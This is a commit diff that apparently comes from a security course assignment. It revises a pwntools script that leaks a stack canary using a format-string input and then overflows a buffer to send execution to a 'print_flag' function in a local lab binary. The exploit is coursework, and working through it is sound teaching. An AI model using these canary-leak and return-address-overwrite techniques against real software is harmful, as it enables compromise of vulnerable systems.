3253a72b65a8e46d9ae911decae1a519e4f32271
riyagupta535 <164948364+riyagupta535@users.noreply.github.com>
2025-11-04 23:24:50 +0000

    fixed part3.py

--- assignment-2/3-killing-the-canary/part3.py
+++ assignment-2/3-killing-the-canary/part3.py
@@ -8,26 +8,28 @@ r = process([exe.path])
 # gdb.attach(r)
 
 r.recvuntil(b"What's your name? ")
-r.sendline(b"%19$lx") #Add your code here
+r.sendline(b"%19$ld") #Add your code here
 
-_ = r.recvline()
-canary = _.decode().split(' ')[1].strip()
-canary = int(canary, 16)
-
-# val = r.recvuntil(b"What's your message? ")
+val = r.recvuntil(b"What's your message? ")
 # log.info(val)
-# canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
-# log.info(f"Canary: {canary:x}")
+
+m_hex = re.search(br'0x([0-9a-fA-F]+)', val)
+if m_hex:
+    canary = int(m_hex.group(1), 16)
+else:
+    canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
+
+log.info(f"Canary: {canary:x}")
 
 win = exe.symbols['print_flag']
 # log.info(hex(win))
 
-payload = b"A" * 72
+payload = b'AAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBBAAAABBBB'
 payload += p64(canary)
-payload += b"B" * 8
+payload += p64(win)
 payload += p64(win)
 
 r.sendline(payload)
 
-r.recvall()
-print(_.decode())
+r.recvline()
+r.interactive()
